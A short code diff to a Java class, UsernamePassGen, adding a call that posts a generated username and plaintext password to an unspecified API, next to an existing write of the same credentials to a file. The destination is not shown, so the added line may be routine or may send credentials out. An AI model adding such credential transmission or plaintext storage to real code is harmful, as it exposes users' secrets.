@@ -28,6 +28,7 @@ public class UsernamePassGen {
         int id = genId.getGenId();
         try {
                 writer.writeToFile(username + " " + password +  "$ " + id + " !" + specifier);
+                API.post(username, password, specifier);
             }
         catch (IOException e) {
             e.printStackTrace();
